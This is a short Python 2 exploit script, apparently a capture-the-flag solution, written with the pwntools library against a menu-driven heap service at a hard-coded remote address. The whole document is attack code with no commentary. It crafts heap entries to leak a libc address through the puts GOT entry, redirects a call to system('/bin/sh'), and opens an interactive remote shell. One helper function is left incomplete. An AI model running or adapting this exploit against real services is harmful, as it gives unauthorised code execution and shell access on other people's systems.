#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwnpwnpwn import *
from pwn import *

#host = "10.211.55.6"
#port = 8888
host = "202.120.7.194"
port = 6666
r = remote(host,port)


def add(size,content):
    r.recvuntil("3. Exit\n")
    r.recvuntil("\n")
    r.sendline("1")
    r.recvuntil(":")
    r.sendline(str(size))
    r.recvuntil(":")
    r.sendline(content)

def dele(idx):
    r.recvuntil("3. Exit\n")
    r.recvuntil("\n")
    r.sendline("2")
    r.recvuntil(":")
puts = 0x4007e0
puts_got = 0x000000000603260
add(2014,"orange")
add(2014,"nogg")
add(2046,p64(0) + p64(0x7de) + p64(puts_got) + p64(puts))
r.sendline("2")
r.recvuntil("1. ")
r.recvuntil("1. ")
data = r.recvuntil("\n").strip()
#libc = u64(data.ljust(8,"\x00")) - 0x6f690
libc = u64(data.ljust(8,"\x00")) - 0x000000000006b990
print hex(libc)
r.sendline("2")
system = libc + 0x41490
sh = libc + 0x1633e8
add(2046,p64(0) + p64(0x7de) + p64(sh) + p64(system))
r.sendline("2")
r.interactive()
